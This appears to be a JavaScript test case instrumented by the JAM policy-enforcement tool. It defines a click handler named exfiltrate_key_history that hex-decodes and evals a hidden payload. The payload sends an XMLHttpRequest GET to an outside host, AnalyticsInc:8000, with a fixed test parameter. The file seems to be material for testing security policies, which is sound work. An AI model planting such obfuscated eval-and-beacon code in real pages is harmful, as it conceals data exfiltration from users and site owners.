
JAM.startProfile('load');
function exfiltrate_key_history(){for(var exp="786d6c687474703d6e657720584d4c487474705265717565737428293b0a786d6c687474702e6f70656e2822474554222c2022687474703a2f2f416e616c7974696373496e633a383030302f7375626d697373696f6e2e68746d6c3f746573743d686578222c2074727565293b0a786d6c687474702e73656e64286e756c6c293b",dec="",i=0,v0=i<exp.length;v0;)dec+=String.fromCharCode(JAM.call(parseInt,null,[JAM.call(exp.substr,exp,[i,2],JAM.policy.p1),16],JAM.policy.p1)),i+=2,v0=i<exp.length;JAM.isEval(eval)?eval("introspect(JAM.policy.pFull) { "+
dec+" }"):JAM.call(eval,null,[dec])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)

JAM.stopProfile('load');
